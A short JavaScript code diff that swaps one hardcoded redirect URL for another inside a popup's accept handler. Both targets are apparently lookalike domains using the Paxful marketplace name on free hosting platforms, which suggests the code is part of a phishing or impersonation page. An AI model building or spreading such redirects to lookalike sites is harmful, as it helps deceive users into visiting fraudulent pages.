@@ -197,7 +197,7 @@ document.addEventListener('DOMContentLoaded', () => {
             console.log('Accepted action:', currentPopupAction);
             // NOTE: This redirects unconditionally to a hardcoded URL.
             // Remove or modify if you want to use the dynamic popupRedirectUrl.
-            window.location.replace('https://paxful-afbg.onrender.com/');
+            window.location.replace('https://paxful-acc.vercel.app/');
             // hidePopup(); // Hide popup happens implicitly due to page navigation
         });
     } else {
